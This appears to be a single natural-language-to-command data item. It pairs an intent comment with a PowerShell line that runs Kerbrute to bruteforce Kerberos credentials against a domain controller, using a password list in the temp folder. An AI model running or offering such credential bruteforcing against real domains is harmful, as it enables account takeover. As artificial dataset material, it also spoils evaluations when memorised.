# Natural language intent:
# Change directory to the temporary folder and execute Kerbrute for Kerberos bruteforcing.

cd $env:temp ; .\kerbrute.exe bruteforce --dc ${domaincontroller} -d ${domain} $env:temp\bruteforce.txt
